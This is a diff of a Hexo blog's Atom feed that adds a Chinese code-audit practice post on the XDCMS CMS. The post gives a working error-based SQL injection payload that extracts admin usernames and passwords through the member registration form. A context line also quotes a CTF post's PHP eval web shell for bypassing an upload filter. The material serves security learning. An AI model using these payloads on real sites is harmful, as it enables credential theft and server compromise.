@@ -1,20 +1,37 @@
 <?xml version="1.0" encoding="utf-8"?>
 <feed xmlns="http://www.w3.org/2005/Atom">
-  <title>Hexo</title>
+  <title>Xiaotan</title>
   
   
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://yoursite.com/"/>
-  <updated>2020-06-01T13:35:00.000Z</updated>
+  <updated>2020-06-23T03:15:55.378Z</updated>
   <id>http://yoursite.com/</id>
   
-  <author>
-    <name>John Doe</name>
-    
-  </author>
-  
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>代码审计练习（一）</title>
+    <link href="http://yoursite.com/2020/06/23/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0%EF%BC%88%E4%B8%80%EF%BC%89/"/>
+    <id>http://yoursite.com/2020/06/23/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0%EF%BC%88%E4%B8%80%EF%BC%89/</id>
+    <published>2020-06-23T03:15:55.378Z</published>
+    <updated>2020-06-23T03:15:55.378Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="代码审计练习（一）"><a href="#代码审计练习（一）" class="headerlink" title="代码审计练习（一）"></a>代码审计练习（一）</h1><h2 id="XDCMS"><a href="#XDCMS" class="headerlink" title="XDCMS"></a>XDCMS</h2><p><img src="C:%5CUsers%5Cykpc%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200623103752008.png" alt="image-20200623103752008"></p><p>先打开index.php，有代码知先坚持config.inc.php是否存在不存在则跳转到安装页面。打开commmon.inc.php看一下。</p><p><img src="C:%5CUsers%5Cykpc%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200623104149304.png" alt="image-20200623104149304"></p><p>再打开xdcms.inc.php，有提示打开fun.inc.php，在该文件中，对接收参数使用safe_html()和save_replace()函数进行过滤。</p><p><img src="C:%5CUsers%5Cykpc%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200623104541913.png" alt="image-20200623104541913"></p><p>可以看到这里进行了过滤。</p><p><img src="C:%5CUsers%5Cykpc%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200623104616205.png" alt="image-20200623104616205"></p><p><img src="C:%5CUsers%5Cykpc%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200623104648257.png" alt="image-20200623104648257"></p><p>在global.inc.php文件中知对get进行了过滤没有进行POST的过滤。</p><p><img src="C:%5CUsers%5Cykpc%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200623105333159.png" alt="image-20200623105333159"></p><p>fileds没有过滤</p><p><img src="C:%5CUsers%5Cykpc%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200623105453088.png" alt="image-20200623105453088"></p><p><img src="C:%5CUsers%5Cykpc%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200623105635301.png" alt="image-20200623105635301"></p><p>在主页面进行会员注册。数据库报错,但是信息还是可以提交到数据库，会员注册成功，说明没有对提交的特殊字符进行过滤。由数据库报错信息可知，提交的信息是提交到表c_member中。</p><p>在源码中查找query</p><p><img src="C:%5CUsers%5Cykpc%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200623110247381.png" alt="image-20200623110247381"></p><p>考虑到使用数据库报错进行注入，利用代码如下：</p><p><code>update c_member set truename=&#39;simple&#39;,eamil=&#39;3456&#39; where userid=9 and(select 1 from(select count(*),concat((select (select (select concat(0x7e,0x27,username,0x3a,password,0x3a,encrypt,0x27,0x7e) from c_admin limit 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)#where userid=9</code></p><p>在xdcms数据库执行利用代码。返回报错信息，在网页上执行利用代码：</p><p><code>56&#39; where userid=9 and(select 1 from(select count(*),concat((select (select (select concat(0x7e,0x27,username,0x3a,password,0x3a,encrypt,0x27,0x7e) from c_admin limit 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)#</code></p><p>显示注册成功。</p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h1 id=&quot;代码审计练习（一）&quot;&gt;&lt;a href=&quot;#代码审计练习（一）&quot; class=&quot;headerlink&quot; title=&quot;代码审计练习（一）&quot;&gt;&lt;/a&gt;代码审计练习（一）&lt;/h1&gt;&lt;h2 id=&quot;XDCMS&quot;&gt;&lt;a href=&quot;#XDCMS&quot; class=&quot;header
+      
+    
+    </summary>
+    
+    
+    
+  </entry>
   
   <entry>
     <title>实验环境 vmware12 + KALI2020.2</title>
@@ -431,28 +448,6 @@
       
       
         &lt;p&gt;今天做了一题是BUUCTF上的checkin&lt;br&gt;一道文件上传题，题目首先对文件内容进行了过滤，过滤了&lt;?因此&lt;?php  ?&gt;就不行了因此应该用&lt;script language=&quot;php&quot;&gt;eval($_POST[&#39;a&#39;]);&lt;/script&gt;。同时这道题对文件名也过滤
-      
-    
-    </summary>
-    
-    
-    
-  </entry>
-  
-  <entry>
-    <title>easy calc</title>
-    <link href="http://yoursite.com/2020/03/18/easy-calc/"/>
-    <id>http://yoursite.com/2020/03/18/easy-calc/</id>
-    <published>2020-03-18T10:59:58.000Z</published>
-    <updated>2020-03-18T10:59:58.972Z</updated>
-    
-    <content type="html"><![CDATA[<p><a href="https://www.cnblogs.com/chrysanthemum/p/11757363.html" target="_blank" rel="noopener">https://www.cnblogs.com/chrysanthemum/p/11757363.html</a></p>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;p&gt;&lt;a href=&quot;https://www.cnblogs.com/chrysanthemum/p/11757363.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://www.cnblogs.com/chrysanthemum/p/11
       
     
     </summary>
